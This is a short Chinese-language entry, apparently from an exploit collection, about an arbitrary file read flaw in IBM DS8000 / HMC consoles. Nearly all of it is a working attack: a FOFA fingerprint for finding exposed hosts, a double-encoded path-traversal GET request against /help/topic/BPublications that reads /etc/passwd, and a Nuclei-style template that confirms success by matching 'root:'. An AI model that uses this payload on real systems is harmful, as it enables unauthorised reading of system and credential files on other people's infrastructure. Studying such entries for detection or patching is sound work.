# ibmDS8000系列产品存在任意文件读取漏洞

- **系统**：ibmDS8000　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`Body=”/preloginmonitor/welcome.jsp”`
- **请求**：`GET /help/topic/BPublications/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd HTTP/1.1`
- **关键头**：`id: ibm-hmc-bpublications-fileread`　`name: IBM HMC BPublications 任意文件读取漏洞`　`author: yy`　`severity: high`

**请求体 / payload**
```
IBM HMC（Hardware Management Console）是独立于 Power 服务器的外置系统，BPublications 接口未对用户传入的参数进行有效过滤，
导致可利用该接口进行任意文件读取，例如读取 /etc/passwd。
tags: ibm,fileread
metadata:
fofa-query: /preloginmonitor/welcome.jsp
verified: true
max-request: 1
http:
- method: GET
path:
- "{{BaseURL}}/help/topic/BPublications/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"
matchers:
- type: dsl
name: fileread
dsl:
- "status_code == 200"
- "contains(body, 'root:')"
```
- **预期**：200　|　root：